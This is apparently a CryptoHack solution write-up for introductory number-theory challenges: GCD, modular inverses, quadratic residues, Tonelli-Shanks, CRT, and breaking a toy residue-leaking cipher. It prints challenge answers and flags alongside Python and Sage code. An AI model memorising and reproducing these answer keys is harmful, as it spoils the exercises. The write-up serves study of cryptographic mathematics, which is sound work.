[{"content":"Greatest Common Divisor The Greatest Common Divisor (GCD), sometimes known as the highest common factor, is the largest number which divides two positive integers (a,b).\nFor a = 12, b = 8 we can calculate the divisors of a: {1,2,3,4,6,12} and the divisors of b: {1,2,4,8}. Comparing these two, we see that gcd(a,b) = 4.\nNow imagine we take a = 11, b = 17. Both a and b are prime numbers. As a prime number has only itself and 1 as divisors, gcd(a,b) = 1.\nWe say that for any two integers a,b, if gcd(a,b) = 1 then a and b are coprime integers.\nIf a and b are prime, they are also coprime. If a is prime and b \u0026lt; a then a and b are coprime. There are many tools to calculate the GCD of two integers, but for this task we recommend looking up Euclid\u0026rsquo;s Algorithm.\nTry coding it up; it\u0026rsquo;s only a couple of lines. Use a = 12, b = 8 to test it.\nNow calculate gcd(a,b) for a = 66528, b = 52920 and enter it below.\nEuclid's Algorithm pseudocode:\n1 2 3 4 5 6 7 function gcd(a, b) while a ≠ b if a \u0026gt; b a := a − b else b := b − a return a 1 2 3 4 5 function gcd(a, b) if b = 0 return a else return gcd(b, a mod b) Solution 1 2 3 4 5 def gcd(a,b): if b == 0: return a else: return gcd(b, a % b) 1 2 3 4 \u0026gt; gcd(12, 8) 4 \u0026gt; gcd(66528, 52920) 1512 Extended GCD Let a and b be positive integers.\nThe extended Euclidean algorithm is an efficient way to find integers u,v such that a * u + b * v = gcd(a,b)\nUsing the two primes p = 26513, q = 32321, find the integers u,v such that p * u + q * v = gcd(p,q)\nEnter whichever of u and v is the lower number as the flag.\nSolution I watched this video and read this article to better understand the extended Euclidean Algorithm.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # source: https://www.geeksforgeeks.org/python-program-for-basic-and-extended-euclidean-algorithms-2/ # function for extended Euclidean Algorithm def gcdExtended(a, b): # Base Case if a == 0 : return b,0,1 gcd,x1,y1 = gcdExtended(b%a, a) # Update x and y using results of recursive call x = y1 - (b//a) * x1 y = x1 return gcd,x,y 1 2 3 4 \u0026gt; gcdExtended(26513, 32321) (1, 10245, -8404) \u0026gt; min(10245, -8404) -8404 Modular Arithmetic 1 Imagine you lean over and look at a cryptographer\u0026rsquo;s notebook. You see some notes in the margin:\n1 2 3 4 + 9 = 1 5 - 7 = 10 2 + 3 = 5 At first you might think they\u0026rsquo;ve gone mad. Maybe this is why there are so many data leaks nowadays you\u0026rsquo;d think, but this is nothing more than modular arithmetic modulo 12 (albeit with some sloppy notation).\nYou may not have been calling it modular arithmetic, but you\u0026rsquo;ve been doing these kinds of calculations since you learnt to tell the time (look again at those equations and think about adding hours).\nFormally, \u0026ldquo;calculating time\u0026rdquo; is described by the theory of congruences. We say that two integers are congruent modulo m if a ≡ b mod m.\nAnother way of saying this, is that when we divide the integer a by m, the remainder is b. This tells you that if m divides a (this can be written as m | a) then a ≡ 0 mod m.\nCalculate the following integers:\n1 2 11 ≡ x mod 6 8146798528947 ≡ y mod 17 The solution is the smaller of the two integers.\nSolution if a ≡ b mod m, then b ≡ a mod m.\nSo:\n11 ≡ x mod 6 -\u0026gt; x ≡ 11 mod 6 -\u0026gt; x ≡ 5\n8146798528947 ≡ y mod 17 -\u0026gt; y ≡ 8146798528947 mod 17 -\u0026gt; y ≡ 4\n1 2 \u0026gt; min(11 % 6, 8146798528947 % 17) 4 Modular Arithmetic 2 We\u0026rsquo;ll pick up from the last challenge and imagine we\u0026rsquo;ve picked a modulus p, and we will restrict ourselves to the case when p is prime.\nThe integers modulo p define a field, denoted Fp.\nA finite field Fp is the set of integers {0,1,...,p-1}, and under both addition and multiplication there is an inverse element b for every element a in the set, such that a + b = 0 and a * b = 1.\nLets say we pick p = 17. Calculate 3^17 mod 17. Now do the same but with 5^17 mod 17.\nWhat would you expect to get for 7^16 mod 17? Try calculating that.\nThis interesting fact is known as Fermat\u0026rsquo;s little theorem. We\u0026rsquo;ll be needing this (and its generalisations) when we look at RSA cryptography.\nNow take the prime p = 65537. Calculate 273246787654^65536 mod 65537.\nDid you need a calculator?\nSolution In summary, Fermat\u0026rsquo;s Little Theorem states that:\n1 2 3 4 if p is prime, for every integer a: pow(a, p) = a mod p and, if p is prime and a is an integer coprime with p: pow(a, p-1) = 1 mod p So:\n1 2 3 4 5 6 7 from math import gcd a = 273246787654 p = 65537 if gcd(a,p) == 1: print(\u0026#34;Coprime! Solution is 1\u0026#34;) Modular Inverting As we\u0026rsquo;ve seen, we can work within a finite field Fp, adding and multiplying elements, and always obtain another element of the field.\nFor all elements g in the field, there exists a unique integer d such that g * d ≡ 1 mod p.\nThis is the multiplicative inverse of g.\nExample: 7 * 8 = 56 ≡ 1 mod 11\nWhat is the inverse element: 3 * d ≡ 1 mod 13?\nSolution Followed this tutorial.\n1 2 3 4 5 6 # a = 3 # c = 13 def imod(a,c): for i in range(c-1): if a*i == 1%c: return i 1 2 3 4 \u0026gt; print(imod(7,11)) 8 \u0026gt; print(imod(3,13)) 9 Alternate solution(s):\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 # source: CryptoHack user @Hon \u0026#39;\u0026#39;\u0026#39; Looking again at Fermat\u0026#39;s little theorem... if p is prime, for every integer a: pow(a, p) = a mod p and, if p is prime and a is an integer coprime with p: pow(a, p-1) = 1 mod p We can do some magic like this: Note: i\u0026#39;ll use math notation, so a^b means pow(a,b) a^(p-1) = 1 (mod p) a^(p-1) * a^-1 = a^-1 (mod p) a^(p-2) * a * a^-1 = a^-1 (mod p) a^(p-2) * 1 = a^-1 (mod p) So finally we have: a^(p-2) = a^-1 (mod p) So, doing a^(p-2) and then (mod p) we can achieve our result \u0026#39;\u0026#39;\u0026#39; a = 3 p = 13 print(pow(a,p-2) % p) 1 2 3 4 5 6 7 8 9 10 11 12 # source: CryptoHack user @DaBaddest \u0026#39;\u0026#39;\u0026#39; The problem given is 3 * d ≡ 1 mod 13 To calculate d we can divide both sides by 3 which gives us d = (1/3) * 1 mod 13 which is equivalent to d = 3^-1 mod 13, where ^ symbol is raised to the power of We can easily convert this into python equation using the pow function \u0026#39;\u0026#39;\u0026#39; print(pow(3, -1, 13)) Quadratic Residues We\u0026rsquo;ve looked at multiplication and division in modular arithmetic, but what does it mean to take the square root modulo an integer?\nFor the following discussion, let\u0026rsquo;s work modulo p = 29. We can take the integer a = 11 and calculate a^2 = 5 mod 29.\nAs a = 11, a^2 = 5, we say the square root of 5 is 11.\nThis feels good, but now let\u0026rsquo;s think about the square root of 18. From the above, we know we need to find some integer a such that a^2 = 18\nYour first idea might be to start with a = 1 and loop to a = p-1. In this discussion p isn\u0026rsquo;t too large and we can quickly look.\nHave a go, try coding this and see what you find. If you\u0026rsquo;ve coded it right, you\u0026rsquo;ll find that for all a ∈ Fp* you never find an a such that a^2 = 18.\nWhat we are seeing, is that for the elements of F*p, not every element has a square root. In fact, what we find is that for roughly one half of the elements of Fp*, there is no square root.\nIn other words, x is a quadratic residue when it is possible to take the square root of x modulo an integer p.\nIn the below list there are two non-quadratic residues and one quadratic residue.\nFind the quadratic residue and then calculate its square root. Of the two possible roots, submit the smaller one as the flag.\n1 2 p = 29 ints = [14, 6, 11] Solution 1 2 3 4 5 p = 29 ints = [14, 6, 11] qr = [a for a in range(p-1) if pow(a,2,p) in ints] print(min(qr)) 1 8 Legendre Symbol In Quadratic Residues we learnt what it means to take the square root modulo an integer. We also saw that taking a root isn\u0026rsquo;t always possible.\nIn the previous case when p = 29, even the simplest method of calculating the square root was fast enough, but as p gets larger, this method becomes wildly unreasonable.\nLucky for us, we have a way to check whether an integer is a quadratic residue with a single calculation thanks to Legendre. In the following, we will assume we are working modulo a prime p.\nBefore looking at Legendre\u0026rsquo;s symbol, let\u0026rsquo;s take a brief detour to see an interesting property of quadratic (non-)residues.\n1 2 3 Quadratic Residue * Quadratic Residue = Quadratic Residue Quadratic Residue * Quadratic Non-residue = Quadratic Non-residue Quadratic Non-residue * Quadratic Non-residue = Quadratic Residue So what\u0026rsquo;s the trick? The Legendre Symbol gives an efficient way to determine whether an integer is a quadratic residue modulo an odd prime p.\nLegendre\u0026rsquo;s Symbol: (a / p) ≡ a^(p-1)/2 mod p obeys:\n1 2 3 (a / p) = 1 if a is a quadratic residue and a ≢ 0 mod p (a / p) = -1 if a is a quadratic non-residue mod p (a / p) = 0 if a ≡ 0 mod p Which means given any integer a, calculating pow(a,(p-1)/2,p) is enough to determine if a is a quadratic residue.\nNow for the flag. Given the following 1024 bit prime and 10 integers, find the quadratic residue and then calculate its square root; the square root is your flag. Of the two possible roots, submit the larger one as your answer.\nChallenge files:\noutput.txt file: output.txt\n1 2 3 p = 101524035174539890485408575671085261788758965189060164484385690801466167356667036677932998889725476582421738788500738738503134356158197247473850273565349249573867251280253564698939768700489401960767007716413932851838937641880157263936985954881657889497583485535527613578457628399173971810541670838543309159139 ints = [25081841204695904475894082974192007718642931811040324543182130088804239047149283334700530600468528298920930150221871666297194395061462592781551275161695411167049544771049769000895119729307495913024360169904315078028798025169985966732789207320203861858234048872508633514498384390497048416012928086480326832803, 45471765180330439060504647480621449634904192839383897212809808339619841633826534856109999027962620381874878086991125854247108359699799913776917227058286090426484548349388138935504299609200377899052716663351188664096302672712078508601311725863678223874157861163196340391008634419348573975841578359355931590555, 17364140182001694956465593533200623738590196990236340894554145562517924989208719245429557645254953527658049246737589538280332010533027062477684237933221198639948938784244510469138826808187365678322547992099715229218615475923754896960363138890331502811292427146595752813297603265829581292183917027983351121325, 14388109104985808487337749876058284426747816961971581447380608277949200244660381570568531129775053684256071819837294436069133592772543582735985855506250660938574234958754211349215293281645205354069970790155237033436065434572020652955666855773232074749487007626050323967496732359278657193580493324467258802863, 4379499308310772821004090447650785095356643590411706358119239166662089428685562719233435615196994728767593223519226235062647670077854687031681041462632566890129595506430188602238753450337691441293042716909901692570971955078924699306873191983953501093343423248482960643055943413031768521782634679536276233318, 85256449776780591202928235662805033201684571648990042997557084658000067050672130152734911919581661523957075992761662315262685030115255938352540032297113615687815976039390537716707854569980516690246592112936796917504034711418465442893323439490171095447109457355598873230115172636184525449905022174536414781771, 50576597458517451578431293746926099486388286246142012476814190030935689430726042810458344828563913001012415702876199708216875020997112089693759638454900092580746638631062117961876611545851157613835724635005253792316142379239047654392970415343694657580353333217547079551304961116837545648785312490665576832987, 96868738830341112368094632337476840272563704408573054404213766500407517251810212494515862176356916912627172280446141202661640191237336568731069327906100896178776245311689857997012187599140875912026589672629935267844696976980890380730867520071059572350667913710344648377601017758188404474812654737363275994871, 4881261656846638800623549662943393234361061827128610120046315649707078244180313661063004390750821317096754282796876479695558644108492317407662131441224257537276274962372021273583478509416358764706098471849536036184924640593888902859441388472856822541452041181244337124767666161645827145408781917658423571721, 18237936726367556664171427575475596460727369368246286138804284742124256700367133250078608537129877968287885457417957868580553371999414227484737603688992620953200143688061024092623556471053006464123205133894607923801371986027458274343737860395496260538663183193877539815179246700525865152165600985105257601565] Solution Tonelli–Shanks algorithmis used to find the square root of n mod p.\nNote: Tonelli-Shanks doesn\u0026rsquo;t work for composite (non-prime) moduli. Finding square roots modulo composites is computationally equivalent to integer factorization.\nSince p = 3 mod 4 is hinted to us, we can concude: [ image source: https://medium.com/@pavanipoluru.21.01/cryptohack-mathematics-d0f691fffe4e ]\n1 2 3 4 5 6 p = 101524035174539890485408575671085261788758965189060164484385690801466167356667036677932998889725476582421738788500738738503134356158197247473850273565349249573867251280253564698939768700489401960767007716413932851838937641880157263936985954881657889497583485535527613578457628399173971810541670838543309159139 ints = [25081841204695904475894082974192007718642931811040324543182130088804239047149283334700530600468528298920930150221871666297194395061462592781551275161695411167049544771049769000895119729307495913024360169904315078028798025169985966732789207320203861858234048872508633514498384390497048416012928086480326832803, 45471765180330439060504647480621449634904192839383897212809808339619841633826534856109999027962620381874878086991125854247108359699799913776917227058286090426484548349388138935504299609200377899052716663351188664096302672712078508601311725863678223874157861163196340391008634419348573975841578359355931590555, 17364140182001694956465593533200623738590196990236340894554145562517924989208719245429557645254953527658049246737589538280332010533027062477684237933221198639948938784244510469138826808187365678322547992099715229218615475923754896960363138890331502811292427146595752813297603265829581292183917027983351121325, 14388109104985808487337749876058284426747816961971581447380608277949200244660381570568531129775053684256071819837294436069133592772543582735985855506250660938574234958754211349215293281645205354069970790155237033436065434572020652955666855773232074749487007626050323967496732359278657193580493324467258802863, 4379499308310772821004090447650785095356643590411706358119239166662089428685562719233435615196994728767593223519226235062647670077854687031681041462632566890129595506430188602238753450337691441293042716909901692570971955078924699306873191983953501093343423248482960643055943413031768521782634679536276233318, 85256449776780591202928235662805033201684571648990042997557084658000067050672130152734911919581661523957075992761662315262685030115255938352540032297113615687815976039390537716707854569980516690246592112936796917504034711418465442893323439490171095447109457355598873230115172636184525449905022174536414781771, 50576597458517451578431293746926099486388286246142012476814190030935689430726042810458344828563913001012415702876199708216875020997112089693759638454900092580746638631062117961876611545851157613835724635005253792316142379239047654392970415343694657580353333217547079551304961116837545648785312490665576832987, 96868738830341112368094632337476840272563704408573054404213766500407517251810212494515862176356916912627172280446141202661640191237336568731069327906100896178776245311689857997012187599140875912026589672629935267844696976980890380730867520071059572350667913710344648377601017758188404474812654737363275994871, 4881261656846638800623549662943393234361061827128610120046315649707078244180313661063004390750821317096754282796876479695558644108492317407662131441224257537276274962372021273583478509416358764706098471849536036184924640593888902859441388472856822541452041181244337124767666161645827145408781917658423571721, 18237936726367556664171427575475596460727369368246286138804284742124256700367133250078608537129877968287885457417957868580553371999414227484737603688992620953200143688061024092623556471053006464123205133894607923801371986027458274343737860395496260538663183193877539815179246700525865152165600985105257601565] qr = [a for a in ints if pow(a, (p-1)//2, p) == 1] print(max([pow(a,(p+1)//4,p) for a in qr])) 1 93291799125366706806545638475797430512104976066103610269938025709952247020061090804870186195285998727680200979853848718589126765742550855954805290253592144209552123062161458584575060939481368210688629862036958857604707468372384278049741369153506182660264876115428251983455344219194133033177700490981696141526 Modular Square Root In Legendre Symbol we introduced a fast way to determine whether a number is a square root modulo a prime. We can go further: there are algorithms for efficiently calculating such roots. The best one in practice is called Tonelli-Shanks, which gets its funny name from the fact that it was first described by an Italian in the 19th century and rediscovered independently by Daniel Shanks in the 1970s.\nAll primes that aren\u0026rsquo;t 2 are of the form p ≡ 1 mod 4 or p ≡ 3 mod 4, since all odd numbers obey these congruences. As the previous challenge hinted, in the p ≡ 3 mod 4 case, a really simple formula for computing square roots can be derived directly from Fermat\u0026rsquo;s little theorem. That leaves us still with the p ≡ 1 mod 4 case, so a more general algorithm is required.\nIn a congruence of the form r2 ≡ a mod p, Tonelli-Shanks calculates r.\nThe main use-case for this algorithm is finding elliptic curve co-ordinates. Its operation is somewhat complex so we\u0026rsquo;re not going to discuss the details, however, implementations are easy to find and Sage has one built-in.\nFind the square root of a modulo the 2048-bit prime p. Give the smaller of the two roots as your answer.\nChallenge files:\noutput.txt file: output.txt\n1 2 a = 8479994658316772151941616510097127087554541274812435112009425778595495359700244470400642403747058566807127814165396640215844192327900454116257979487432016769329970767046735091249898678088061634796559556704959846424131820416048436501387617211770124292793308079214153179977624440438616958575058361193975686620046439877308339989295604537867493683872778843921771307305602776398786978353866231661453376056771972069776398999013769588936194859344941268223184197231368887060609212875507518936172060702209557124430477137421847130682601666968691651447236917018634902407704797328509461854842432015009878011354022108661461024768 p = 30531851861994333252675935111487950694414332763909083514133769861350960895076504687261369815735742549428789138300843082086550059082835141454526618160634109969195486322015775943030060449557090064811940139431735209185996454739163555910726493597222646855506445602953689527405362207926990442391705014604777038685880527537489845359101552442292804398472642356609304810680731556542002301547846635101455995732584071355903010856718680732337369128498655255277003643669031694516851390505923416710601212618443109844041514942401969629158975457079026906304328749039997262960301209158175920051890620947063936347307238412281568760161 Solution 1 2 3 4 from sage.all import * a = 8479994658316772151941616510097127087554541274812435112009425778595495359700244470400642403747058566807127814165396640215844192327900454116257979487432016769329970767046735091249898678088061634796559556704959846424131820416048436501387617211770124292793308079214153179977624440438616958575058361193975686620046439877308339989295604537867493683872778843921771307305602776398786978353866231661453376056771972069776398999013769588936194859344941268223184197231368887060609212875507518936172060702209557124430477137421847130682601666968691651447236917018634902407704797328509461854842432015009878011354022108661461024768 p = 30531851861994333252675935111487950694414332763909083514133769861350960895076504687261369815735742549428789138300843082086550059082835141454526618160634109969195486322015775943030060449557090064811940139431735209185996454739163555910726493597222646855506445602953689527405362207926990442391705014604777038685880527537489845359101552442292804398472642356609304810680731556542002301547846635101455995732584071355903010856718680732337369128498655255277003643669031694516851390505923416710601212618443109844041514942401969629158975457079026906304328749039997262960301209158175920051890620947063936347307238412281568760161 print(mod(a,p).sqrt()) 1 2362339307683048638327773298580489298932137505520500388338271052053734747862351779647314176817953359071871560041125289919247146074907151612762640868199621186559522068338032600991311882224016021222672243139362180461232646732465848840425458257930887856583379600967761738596782877851318489355679822813155123045705285112099448146426755110160002515592418850432103641815811071548456284263507805589445073657565381850521367969675699760755310784623577076440037747681760302434924932113640061738777601194622244192758024180853916244427254065441962557282572849162772740798989647948645207349737457445440405057156897508368531939120 Chinese Remainder Theorem The Chinese Remainder Theorem gives a unique solution to a set of linear congruences if their moduli are coprime.\nThis means, that given a set of arbitrary integers ai, and pairwise coprime integers ni, such that the following linear congruences hold:\n1 2 3 4 x ≡ a1 mod n1 x ≡ a2 mod n2 ... x ≡ an mod nn There is a unique solution x ≡ a mod N where N = n1 * n2 * ... * nn.\nIn cryptography, we commonly use the Chinese Remainder Theorem to help us reduce a problem of very large integers into a set of several, easier problems.\nGiven the following set of linear congruences:\n1 2 3 x ≡ 2 mod 5 x ≡ 3 mod 11 x ≡ 5 mod 17 Find the integer a such that x ≡ a mod 935\nSolution Watched this video to understand the process of crt.\n1 2 from sage.all import * print(crt([2,3,5], [5,11,17])) 1 872 Alternate solution(s):\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 # source: CryptoHack user @Hon \u0026#39;\u0026#39;\u0026#39; Looking at Chinese Remainder Theorem... Taken x = a1 (mod n1) x = a2 (mod n2) x = a3 (mod n3) With gcd(n1,n2) = gcd(n1,n3) = gcd(n2,n3) = 1 -All the n-values are coprime with the others We have N = n1*n2*n3 and N1 = n2*n3 N2 = n1*n3 N3 = n1*n2 Summaring, the Ni values are composed multiplying all the n-values each others, except n at position i Ending, we call yi the solutions of Ni*yi = 1 (mod ni) Ex: N1 * y1 = 1 (mod n1) Now, we have to find the value of integer a such that: x = a (mod N) Knowing also that: x = a1N1y1 + a2N2y2 + a3N3y3 (mod N) Easy, no? \u0026#39;\u0026#39;\u0026#39; # x = 2 mod 5 # x = 3 mod 11 # x = 5 mod 17 # x = a mod 935 length = 3 a = [2,3,5] n = [5,11,17] Ntot= n[0] * n[1] * n[2] N = [ n[1]*n[2] , n[0]*n[2], n[0]*n[1] ] y = [pow(N[i],n[i]-2,n[i]) for i in range(length)] mysterious_a = 0 for i in range(length): mysterious_a += a[i]*N[i]*y[i] mysterious_a %= Ntot print(mysterious_a) Adrien\u0026rsquo;s Signs Adrien\u0026rsquo;s been looking at ways to encrypt his messages with the help of symbols and minus signs. Can you find a way to recover the flag?\nChallenge files:\nsource.py output.txt file: source.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 from random import randint a = 288260533169915 p = 1007621497415251 FLAG = b\u0026#39;crypto{????????????????????}\u0026#39; def encrypt_flag(flag): ciphertext = [] plaintext = \u0026#39;\u0026#39;.join([bin(i)[2:].zfill(8) for i in flag]) for b in plaintext: e = randint(1, p) n = pow(a, e, p) if b == \u0026#39;1\u0026#39;: ciphertext.append(n) else: n = -n % p ciphertext.append(n) return ciphertext print(encrypt_flag(FLAG)) file: outut.txt\n1 [67594220461269, 501237540280788, 718316769824518, 296304224247167, 48290626940198, 30829701196032, 521453693392074, 840985324383794, 770420008897119, 745131486581197, 729163531979577, 334563813238599, 289746215495432, 538664937794468, 894085795317163, 983410189487558, 863330928724430, 996272871140947, 352175210511707, 306237700811584, 631393408838583, 589243747914057, 538776819034934, 365364592128161, 454970171810424, 986711310037393, 657756453404881, 388329936724352, 90991447679370, 714742162831112, 62293519842555, 653941126489711, 448552658212336, 970169071154259, 339472870407614, 406225588145372, 205721593331090, 926225022409823, 904451547059845, 789074084078342, 886420071481685, 796827329208633, 433047156347276, 21271315846750, 719248860593631, 534059295222748, 879864647580512, 918055794962142, 635545050939893, 319549343320339, 93008646178282, 926080110625306, 385476640825005, 483740420173050, 866208659796189, 883359067574584, 913405110264883, 898864873510337, 208598541987988, 23412800024088, 911541450703474, 57446699305445, 513296484586451, 180356843554043, 756391301483653, 823695939808936, 452898981558365, 383286682802447, 381394258915860, 385482809649632, 357950424436020, 212891024562585, 906036654538589, 706766032862393, 500658491083279, 134746243085697, 240386541491998, 850341345692155, 826490944132718, 329513332018620, 41046816597282, 396581286424992, 488863267297267, 92023040998362, 529684488438507, 925328511390026, 524897846090435, 413156582909097, 840524616502482, 325719016994120, 402494835113608, 145033960690364, 43932113323388, 683561775499473, 434510534220939, 92584300328516, 763767269974656, 289837041593468, 11468527450938, 628247946152943, 8844724571683, 813851806959975, 72001988637120, 875394575395153, 70667866716476, 75304931994100, 226809172374264, 767059176444181, 45462007920789, 472607315695803, 325973946551448, 64200767729194, 534886246409921, 950408390792175, 492288777130394, 226746605380806, 944479111810431, 776057001143579, 658971626589122, 231918349590349, 699710172246548, 122457405264610, 643115611310737, 999072890586878, 203230862786955, 348112034218733, 240143417330886, 927148962961842, 661569511006072, 190334725550806, 763365444730995, 516228913786395, 846501182194443, 741210200995504, 511935604454925, 687689993302203, 631038090127480, 961606522916414, 138550017953034, 932105540686829, 215285284639233, 772628158955819, 496858298527292, 730971468815108, 896733219370353, 967083685727881, 607660822695530, 650953466617730, 133773994258132, 623283311953090, 436380836970128, 237114930094468, 115451711811481, 674593269112948, 140400921371770, 659335660634071, 536749311958781, 854645598266824, 303305169095255, 91430489108219, 573739385205188, 400604977158702, 728593782212529, 807432219147040, 893541884126828, 183964371201281, 422680633277230, 218817645778789, 313025293025224, 657253930848472, 747562211812373, 83456701182914, 470417289614736, 641146659305859, 468130225316006, 46960547227850, 875638267674897, 662661765336441, 186533085001285, 743250648436106, 451414956181714, 527954145201673, 922589993405001, 242119479617901, 865476357142231, 988987578447349, 430198555146088, 477890180119931, 844464003254807, 503374203275928, 775374254241792, 346653210679737, 789242808338116, 48503976498612, 604300186163323, 475930096252359, 860836853339514, 994513691290102, 591343659366796, 944852018048514, 82396968629164, 152776642436549, 916070996204621, 305574094667054, 981194179562189, 126174175810273, 55636640522694, 44670495393401, 74724541586529, 988608465654705, 870533906709633, 374564052429787, 486493568142979, 469485372072295, 221153171135022, 289713227465073, 952450431038075, 107298466441025, 938262809228861, 253919870663003, 835790485199226, 655456538877798, 595464842927075, 191621819564547] Solution First hint to the problem is the title: Adrien's Signs. The Legendre symbol was introduced by Adrien-Marie Legendre, so it would seem wise to use it here. Let\u0026rsquo;s look more into the code to see what\u0026rsquo;s going on.\nBasically, the byte letters of the plaintext flag are each converted to 8 bits (with padding of zeros). These are then joined together to make a large string of bits. For every bit, a**randit(1,p) % p is done to create n. If the bit happens to be 1, n is appended to the ciphertext list - otherwise n = -n % p occurs before appending n to the list.\nSo, we just need to determine whether the value is a 0 or 1 for each bit of information.\nFirst, we ensure a is indeed prime.\nThen, we check to make sure that (a / p) = 1 by the Legendre symbol to prove a is quadratic residue of mod p. Since this is the case, all encrypted values that are also quadratic residues of mod p will leak the value 1 back to us. In the case of the bit being 0, -n mod p = a^e mod p which becomes n = -a^e or (-1/p):\n[ image source: https://en.wikipedia.org/wiki/Legendre_symbol ]\nTherefore, when encrypted values are non-quadratic residue, it is a 0 bit.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 from Crypto.Util.number import long_to_bytes a = 288260533169915 p = 1007621497415251 enc = [67594220461269, 501237540280788, 718316769824518, 296304224247167, 48290626940198, 30829701196032, 521453693392074, 840985324383794, 770420008897119, 745131486581197, 729163531979577, 334563813238599, 289746215495432, 538664937794468, 894085795317163, 983410189487558, 863330928724430, 996272871140947, 352175210511707, 306237700811584, 631393408838583, 589243747914057, 538776819034934, 365364592128161, 454970171810424, 986711310037393, 657756453404881, 388329936724352, 90991447679370, 714742162831112, 62293519842555, 653941126489711, 448552658212336, 970169071154259, 339472870407614, 406225588145372, 205721593331090, 926225022409823, 904451547059845, 789074084078342, 886420071481685, 796827329208633, 433047156347276, 21271315846750, 719248860593631, 534059295222748, 879864647580512, 918055794962142, 635545050939893, 319549343320339, 93008646178282, 926080110625306, 385476640825005, 483740420173050, 866208659796189, 883359067574584, 913405110264883, 898864873510337, 208598541987988, 23412800024088, 911541450703474, 57446699305445, 513296484586451, 180356843554043, 756391301483653, 823695939808936, 452898981558365, 383286682802447, 381394258915860, 385482809649632, 357950424436020, 212891024562585, 906036654538589, 706766032862393, 500658491083279, 134746243085697, 240386541491998, 850341345692155, 826490944132718, 329513332018620, 41046816597282, 396581286424992, 488863267297267, 92023040998362, 529684488438507, 925328511390026, 524897846090435, 413156582909097, 840524616502482, 325719016994120, 402494835113608, 145033960690364, 43932113323388, 683561775499473, 434510534220939, 92584300328516, 763767269974656, 289837041593468, 11468527450938, 628247946152943, 8844724571683, 813851806959975, 72001988637120, 875394575395153, 70667866716476, 75304931994100, 226809172374264, 767059176444181, 45462007920789, 472607315695803, 325973946551448, 64200767729194, 534886246409921, 950408390792175, 492288777130394, 226746605380806, 944479111810431, 776057001143579, 658971626589122, 231918349590349, 699710172246548, 122457405264610, 643115611310737, 999072890586878, 203230862786955, 348112034218733, 240143417330886, 927148962961842, 661569511006072, 190334725550806, 763365444730995, 516228913786395, 846501182194443, 741210200995504, 511935604454925, 687689993302203, 631038090127480, 961606522916414, 138550017953034, 932105540686829, 215285284639233, 772628158955819, 496858298527292, 730971468815108, 896733219370353, 967083685727881, 607660822695530, 650953466617730, 133773994258132, 623283311953090, 436380836970128, 237114930094468, 115451711811481, 674593269112948, 140400921371770, 659335660634071, 536749311958781, 854645598266824, 303305169095255, 91430489108219, 573739385205188, 400604977158702, 728593782212529, 807432219147040, 893541884126828, 183964371201281, 422680633277230, 218817645778789, 313025293025224, 657253930848472, 747562211812373, 83456701182914, 470417289614736, 641146659305859, 468130225316006, 46960547227850, 875638267674897, 662661765336441, 186533085001285, 743250648436106, 451414956181714, 527954145201673, 922589993405001, 242119479617901, 865476357142231, 988987578447349, 430198555146088, 477890180119931, 844464003254807, 503374203275928, 775374254241792, 346653210679737, 789242808338116, 48503976498612, 604300186163323, 475930096252359, 860836853339514, 994513691290102, 591343659366796, 944852018048514, 82396968629164, 152776642436549, 916070996204621, 305574094667054, 981194179562189, 126174175810273, 55636640522694, 44670495393401, 74724541586529, 988608465654705, 870533906709633, 374564052429787, 486493568142979, 469485372072295, 221153171135022, 289713227465073, 952450431038075, 107298466441025, 938262809228861, 253919870663003, 835790485199226, 655456538877798, 595464842927075, 191621819564547] # Check if prime is of the form p ≡ 3 mod 4 (not p ≡ 1 mod 4) # pow(a, (p-1)//2, p) == kronecker(a,p) assert kronecker(a, p) == 1 pt_bits = \u0026#39;0b\u0026#39; for x in enc: # pow(x, (p-1)//2, p) == kronecker(x,p) qr = kronecker(x, p) if qr == 1: pt_bits += \u0026#39;1\u0026#39; else: # qr == p-1 =\u0026gt; 1007621497415250 pt_bits += \u0026#39;0\u0026#39; pt_int = int(pt_bits,2) print(long_to_bytes(pt_int)) 1 b\u0026#39;crypto{p4tterns_1n_re5idu3s}\u0026#39; Modular Binomials Rearrange the following equations to get the primes p,q\n1 2 3 N = p*q c1 = (2*p + 3*q)**e1 mod N c2 = (5*p + 7*q)**e2 mod N Challenge files:\ndata.txt file: data.txt\n1 2 3 4 5 N = 14905562257842714057932724129575002825405393502650869767115942606408600343380327866258982402447992564988466588305174271674657844352454543958847568190372446723549627752274442789184236490768272313187410077124234699854724907039770193680822495470532218905083459730998003622926152590597710213127952141056029516116785229504645179830037937222022291571738973603920664929150436463632305664687903244972880062028301085749434688159905768052041207513149370212313943117665914802379158613359049957688563885391972151218676545972118494969247440489763431359679770422939441710783575668679693678435669541781490217731619224470152467768073 e1 = 12886657667389660800780796462970504910193928992888518978200029826975978624718627799215564700096007849924866627154987365059524315097631111242449314835868137 e2 = 12110586673991788415780355139635579057920926864887110308343229256046868242179445444897790171351302575188607117081580121488253540215781625598048021161675697 c1 = 14010729418703228234352465883041270611113735889838753433295478495763409056136734155612156934673988344882629541204985909650433819205298939877837314145082403528055884752079219150739849992921393509593620449489882380176216648401057401569934043087087362272303101549800941212057354903559653373299153430753882035233354304783275982332995766778499425529570008008029401325668301144188970480975565215953953985078281395545902102245755862663621187438677596628109967066418993851632543137353041712721919291521767262678140115188735994447949166616101182806820741928292882642234238450207472914232596747755261325098225968268926580993051 c2 = 14386997138637978860748278986945098648507142864584111124202580365103793165811666987664851210230009375267398957979494066880296418013345006977654742303441030008490816239306394492168516278328851513359596253775965916326353050138738183351643338294802012193721879700283088378587949921991198231956871429805847767716137817313612304833733918657887480468724409753522369325138502059408241232155633806496752350562284794715321835226991147547651155287812485862794935695241612676255374480132722940682140395725089329445356434489384831036205387293760789976615210310436732813848937666608611803196199865435145094486231635966885932646519 Solution Unintended solution is factordb!\n1 2 3 p = 112274000169258486390262064441991200608556376127408952701514962644340921899196091557519382763356534106376906489445103255177593594898966250176773605432765983897105047795619470659157057093771407309168345670541418772427807148039207489900810013783673957984006269120652134007689272484517805398390277308001719431273 q = 132760587806365301971479157072031448380135765794466787456948786731168095877956875295282661565488242190731593282663694728914945967253173047324353981530949360031535707374701705328450856944598803228299967009004598984671293494375599408764139743217465012770376728876547958852025425539298410751132782632817947101601 